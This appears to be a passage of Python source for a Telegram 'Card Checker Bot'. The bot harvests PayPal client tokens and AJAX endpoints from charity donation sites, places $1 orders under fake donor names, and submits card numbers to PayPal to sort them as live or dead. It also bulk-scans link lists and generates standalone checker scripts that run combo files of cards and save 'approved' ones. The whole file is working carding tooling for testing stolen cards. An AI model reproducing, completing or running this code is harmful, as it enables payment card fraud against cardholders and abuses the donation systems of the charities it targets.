    def _get_oauth_token(self):
        if not self.client_id:
            return None
        try:
            auth_header = base64.b64encode(f"{self.client_id}:".encode()).decode()
            headers = {
                'authorization': f'Basic {auth_header}',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': self.uu.random,
            }
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data={'grant_type': 'client_credentials'},
                timeout=15
            )
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        return None
    
    def _get_client_token_from_site(self):
        if not self.ajax_url:
            return None
        actions = [
            'give_paypal_commerce_get_client_token',
            'get_client_token',
            'paypal_get_client_token',
            'give_paypal_get_client_token',
            'ppcp_get_client_token',
            'wc_ppcp_get_client_token',
        ]
        for action in actions:
            try:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {
                    'user-agent': self.uu.random,
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                }
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    token = None
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict):
                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
                        elif isinstance(json_data['data'], str):
                            token = json_data['data']
                    elif 'client_token' in json_data:
                        token = json_data['client_token']
                    elif 'token' in json_data:
                        token = json_data['token']
                    elif 'access_token' in json_data:
                        token = json_data['access_token']
                    
                    if token:
                        if '.' not in token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                                if token_match:
                                    return token_match.group(1)
                            except:
                                pass
                        return token
            except:
                continue
        return None
    
    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for action in actions:
            params = {'action': action}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                return json_data['data']
                        if 'id' in json_data:
                            return json_data['id']
                    except:
                        pass
            except:
                continue
        return None
    
    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'paypal-request-id': str(uuid.uuid4()),
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{'amount': {'currency_code': 'USD', 'value': self.donation}}],
                'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id')
        except:
            pass
        return None
    
    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for action in actions:
            params = {'action': action, 'order': order_id}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None
    
    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            
            order_id = None
            if self.ajax_url and 'admin-ajax' in self.ajax_url:
                order_id = self._create_order_givewp()
            if not order_id and self.access_token:
                order_id = self._create_order_direct()
            
            if not order_id:
                return "DECLINED"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_json = {}
            for auth_token in auth_tokens:
                he4 = {
                    'authorization': f'Bearer {auth_token}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        }
                    },
                    'application_context': {'vault': False},
                }
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                for keyword in LIVE_RESPONSES:
                    if keyword.upper() in confirm_str:
                        if keyword == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        return keyword
            
            approve_res = self._approve_order_givewp(order_id)
            if approve_res:
                text = approve_res.text
                for keyword in LIVE_RESPONSES:
                    if keyword.upper() in text.upper():
                        if keyword == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        return keyword
                if 'true' in text.lower():
                    return "CHARGE 1.0"
            
            return "DECLINED"
        except Exception as e:
            return f"Error: {str(e)[:100]}"
            
            # ═══ Check Single Link Functions ═══
def check_single_link_with_browser(link):
    """فحص بـ Playwright - يرجع الرد الحقيقي من الموقع"""
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        if HAS_PLAYWRIGHT:
            browser = PayPalBrowserAutomation(link, headless=True)
            result = browser.run(
                card_number=TEST_CARD_NUMBER,
                expiry=TEST_CARD_EXPIRY,
                cvc=TEST_CARD_CVC
            )
            
            is_live = False
            for pr in LIVE_RESPONSES:
                if pr.lower() in result.lower():
                    is_live = True
                    break
            
            return {
                'link': link,
                'live': is_live,
                'respons': result,
                'tokens': browser.tokens,
                'form_data': browser.form_data,
                'html': browser.html[:5000],
                'method': 'playwright'
            }
        else:
            return check_single_link_request(link)
    except Exception as e:
        return {'link': link, 'live': False, 'respons': f'Error: {str(e)[:100]}'}

def check_single_link_request(link):
    """فحص عادي (request-based) - للـ Mass"""
    paypal = None
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        paypal = PayPalRequestChecker(target_url=link)
        result = paypal.Charge(TEST_CARD)
        
        is_live = False
        for pr in LIVE_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result}
        
        return {
            'link': link,
            'live': is_live,
            'respons': result,
            'client_id': paypal.client_id or '',
            'access_token': paypal.access_token or '',
            'client_token': paypal.client_token or '',
            'form_data': paypal.form_data,
            'ajax_url': paypal.ajax_url or '',
            'cookies': paypal.cookies,
            'url': paypal.url,
            'inurl': paypal.inurl,
            'site_type': paypal.site_type,
            'method': 'request'
        }
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}
    finally:
        if paypal and hasattr(paypal, 'r'):
            try:
                paypal.r.close()
            except:
                pass

# ═══ Generate Gateway Code ═══
def generate_gateway_code(result):
    client_id = result.get('client_id', '')
    access_token = result.get('access_token', '')
    client_token = result.get('client_token', '')
    form_data = result.get('form_data', {})
    ajax_url = result.get('ajax_url', '')
    cookies = result.get('cookies', {})
    url = result.get('url', '')
    inurl = result.get('inurl', '')
    
    return f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{client_id}"
        self.access_token = "{access_token}"
        self.client_token = "{client_token}"
        self.form_data = {form_data}
        self.ajax_url = "{ajax_url}"
        self.cookies = {cookies}
        self.url = "{url}"
        self.inurl = "{inurl}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{{yy}}-{{mm}}"
            
            order_id = None
            if self.ajax_url:
                order_id = self._create_order_givewp()
            if not order_id and self.access_token:
                order_id = self._create_order_direct()
            
            if not order_id:
                return "DECLINED"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            for auth_token in auth_tokens:
                he4 = {{
                    'authorization': f'Bearer {{auth_token}}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    if confirm_res.status_code == 200:
                        confirm_json = confirm_res.json()
                        confirm_str = str(confirm_json).upper()
                        if 'INSUFFICIENT_FUNDS' in confirm_str:
                            return "INSUFFICIENT_FUNDS"
                        if 'EXPIRED_CARD' in confirm_str:
                            return "EXPIRED_CARD"
                        if 'ORDER_NOT_APPROVED' in confirm_str:
                            return "Payer cannot pay for this transaction."
                        break
                except:
                    continue
            
            approve_res = self._approve_order_givewp(order_id)
            if approve_res:
                text = approve_res.text
                if 'true' in text.lower():
                    return "CHARGE 1.0"
                if 'INSUFFICIENT' in text.upper():
                    return "INSUFFICIENT_FUNDS"
            
            return "DECLINED"
        except Exception as e:
            return f"Error: {{e}}"

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        for action in ['give_paypal_commerce_create_order', 'give_create_order']:
            try:
                response = self.r.post(self.ajax_url, params={{'action': action}}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    json_data = response.json()
                    if 'data' in json_data and isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                        return json_data['data']['id']
                    if 'id' in json_data:
                        return json_data['id']
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {{
                'authorization': f'Bearer {{self.access_token}}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
            }}
            data = {{
                'intent': 'CAPTURE',
                'purchase_units': [{{'amount': {{'currency_code': 'USD', 'value': self.donation}}}}],
                'application_context': {{'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            }}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id')
        except:
            pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        for action in ['give_paypal_commerce_approve_order', 'give_approve_order']:
            try:
                response = self.r.post(self.ajax_url, params={{'action': action, 'order': order_id}}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

if __name__ == '__main__':
    Getat = 'PayPal Playwright 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''

# ═══ Bot Commands ═══
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
        return
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''🚀 <b>Welcome To Card Checker Bot</b> 🌟
━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {userr}
📛 <b>Username:</b> @{username}
🆔 <b>ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━
💎 <b>PayPal Gateway</b> → /paypal
💰 <b>Mass Extract</b> → /mass
📨 <b>Send Feedback</b> → Button Below
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('📨 Submit Feedback', callback_data='yrr')
    FRA.add(Yes22)
    
    safe_send_message(message.chat.id, IU, reply_markup=FRA)

@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("🔙 Back", callback_data="start")
    Atty.add(back)
    YTT = f'📨 Welcome {userr}\n\nSend your message and the admin will respond.'
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
    except:
        pass
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"📨 <b>New Message</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>From:</b> {name}\n🆔 <b>ID:</b> {user_id}\n💬 <b>Message:</b> {message.text}", reply_markup=kb)
    safe_send_message(user_id, "✅ Your message has been sent.")
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "✍️ Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, f"👨‍💻 <b>Admin response:</b>\n\n{message.text}")
    safe_send_message(OWNER_ID, "✅ Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'🚀 <b>Welcome To Card Checker Bot</b> 🌟\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> {userr}\n📛 <b>Username:</b> @{username}\n🆔 <b>ID:</b> <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('📨 Submit Feedback', callback_data='yrr')
    FRA.add(Yes22)
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except:
        pass

@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def check_paypal(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
        return
    
    ko = safe_send_message(message.chat.id, "🔍 <b>Scanning Gateway with Browser Automation...</b>")
    if not ko:
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(message.chat.id, ko.message_id, '📝 <b>Usage:</b>\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return
        
        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(message.chat.id, ko.message_id, "❌ <b>Invalid link format</b>")
            return
        
        safe_edit_message(message.chat.id, ko.message_id, "✅ <b>Gateway found! Opening browser...</b>")
        
        result = check_single_link_with_browser(link)
        
        if result['live']:
            file_name = f'gateway_{int(time.time())}.py'
            code = generate_gateway_code(result)
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(code)
            
            caption = f'''💎 <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{link}</code>
💬 <b>Response:</b> <code>{result['respons']}</code>
🛠️ <b>Method:</b> <code>{result.get('method', 'playwright')}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
            
            safe_send_document(message.chat.id, file_name, caption=caption)
            try:
                os.remove(file_name)
            except:
                pass
        else:
            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Dead Gateway</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 <b>Link:</b> <code>{link}</code>\n📝 <b>Response:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\n⚡ <b>Dev:</b> @FAWZY30")
    
    except Exception as e:
        safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Error:</b> {str(e)[:100]}")

@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 The admin has blocked you.')
        return
    
    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 <b>Stopping...</b>")
    else:
        safe_send_message(message.chat.id, "❌ <b>No active process.</b>")

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ <b>Please send a .txt file.</b>")
        return
    
    try:
        # Sticker
        try:
            bot.send_sticker(message.chat.id, STICKER_FILE_ID)
        except:
            pass
        
        file_info = safe_get_file(message.document.file_id)
        if not file_info:
            safe_send_message(message.chat.id, "❌ Failed to get file.")
            return
        
        downloaded_file = safe_download_file(file_info.file_path)
        if not downloaded_file:
            safe_send_message(message.chat.id, "❌ Failed to download file.")
            return
        
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]
        
        if not links:
            safe_send_message(message.chat.id, "❌ <b>File is empty.</b>")
            return
        
        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 <b>Total Links:</b> {total}
✅ <b>Live:</b> 0
❌ <b>Dead:</b> 0
⏳ <b>Progress:</b> 0% ░░░░░░░░░░░░░░░░░░░░
🔗 <b>Url:</b> ...
💬 <b>Respons:</b> ...
━━━━━━━━━━━━━━━━━━
⏱️ <b>Checked:</b> 0 of {total}
🛑 /stop to stop""")
        
        if not status_msg:
            return
        
        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 <b>Total Links:</b> {total}
✅ <b>Live:</b> {live}
❌ <b>Dead:</b> {dead}
⏳ <b>Progress:</b> {percent}% {bar}
🔗 <b>Url:</b> <code>{current_url[:60] if current_url else '...'}</code>
💬 <b>Respons:</b> <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ <b>Checked:</b> {processed} of {total}
🛑 /stop to stop"""
                        if text != last_text:
                            try:
                                bot.edit_message_text(premium_emoji(text), chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass
        
        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        
        time.sleep(1)
        
        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            result = check_single_link_request(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    
                    try:
                        code = generate_gateway_code(result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        
                        caption = f"""💎 <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{result['link']}</code>
💬 <b>Respons:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""
                        
                        safe_send_document(chat_id, file_name, caption=caption)
                        try:
                            os.remove(file_name)
                        except:
                            pass
                        time.sleep(1)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            if idx % 5 == 0:
                time.sleep(0.5)
            
            if idx % 50 == 0 and idx > 0:
                gc.collect()
        
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=3)
        
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 <b>Total Links:</b> {total}
✅ <b>Live (Sent):</b> {live}
❌ <b>Dead:</b> {dead}
💯 <b>Success Rate:</b> {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""
        
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        
        if user_id in processing_status:
            del processing_status[user_id]
    
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ <b>Error:</b> {str(e)[:100]}")
        if 'user_id' in locals() and user_id in processing_status:
            del processing_status[user_id]

@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ <b>You do not have permission.</b>")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ <b>User ID {user_id_to_block} blocked.</b>")
    except:
        safe_send_message(message.chat.id, "📝 <b>Usage:</b> /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ <b>You do not have permission.</b>")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ <b>User ID {user_id_to_unblock} unblocked.</b>")
    except:
        safe_send_message(message.chat.id, "📝 <b>Usage:</b> /unblock2 [user_id]")

# ═══ Run ═══
print('🚀 Bot is running...')

if __name__ == '__main__':
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
        except KeyboardInterrupt:
            print('🛑 Bot stopped by user')
            break
        except Exception as e:
            error_str = str(e)
            if "502" in error_str or "Bad Gateway" in error_str:
                time.sleep(10)
            elif "409" in error_str:
                time.sleep(15)
            elif "429" in error_str:
                time.sleep(30)
            elif "timeout" in error_str.lower():
                time.sleep(5)
            elif "Connection" in error_str:
                time.sleep(5)
            elif "500" in error_str:
                time.sleep(10)
            else:
                time.sleep(5)
